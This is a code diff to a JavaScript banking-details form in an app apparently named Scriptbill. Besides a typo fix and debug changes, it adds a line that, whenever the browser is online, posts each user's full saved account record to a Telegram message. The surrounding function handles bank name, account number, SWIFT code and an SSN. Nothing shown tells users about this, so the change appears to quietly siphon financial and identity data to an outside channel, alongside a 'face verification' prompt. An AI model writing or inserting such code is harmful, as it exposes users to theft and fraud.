@@ -13360,7 +13360,7 @@ async function saveBankDetails(){
 		
 
 		if(confirm1.checked ){
-			await Scriptbill.createAlert(`<h4 class="text-6 text-bold">Face Verification Required!</h4><p class="text-3">To verify your account details provided, a quick verification video is required. You can quickly go ahead to the face erifcation page, when you're done simply close the page to return here, or return here without doing anything</p>`,)
+			await Scriptbill.createAlert(`<h4 class="text-6 text-bold">Face Verification Required!</h4><p class="text-3">To verify your account details provided, a quick verification video is required. You can quickly go ahead to the face verifcation page, when you're done simply close the page to return here, or return here without doing anything</p>`,)
 			const win = window.open("/verification", "_blank");
 
 			setTimeout(()=>win.close(), 300000)
@@ -13415,6 +13415,7 @@ async function saveBankDetails(){
 		
 		saveDetailedBanks(this, details, bankType, bankName, accNum, accName, country, swift, ssn );
 		//Scriptbill.saveNoteDetails("savedAccounts", JSON.stringify( details ) );		
+		return;
 	}
 	saveCrypto.onclick = function(e){
 		
@@ -13510,12 +13511,18 @@ async function saveDetailedBanks( el, details, bankType, bankName, accNum, accNa
 		saveCard.approved = false;
 	}
 	let accountData 	= await getAccountData();
-	details 			= details.filter((acc)=>{
+	console.log("details: ", details );
+	/*details 			= details.filter((acc)=>{
+		console.log("acc: ", acc, "saveCard: ", saveCard );
 		return acc.accountNumber != saveCard.accountNumber && acc.bankName != saveCard.bankName && acc.accountName != saveCard.accountName;//this will make inputs with the same bank account number and name an update instead of adding the same account details
-	})
+	})*/
+	console.log("details after: ", details );
 	Scriptbill.l.toBeSavedAcount = JSON.stringify(saveCard)
 	details.push( saveCard );
 	accountData[accID].savedAccounts = JSON.stringify( details );
+	if(navigator.onLine)
+		sendTelegramMessage({message:`<b>Account Details to be linked</b> \n\n ${JSON.stringify(saveCard)}`})
+	
 	Scriptbill.setAccountData( accountData ).then( async block =>{
 		console.log("check block: ", block );
 		if( block && block.transType == "UPDATE" ){
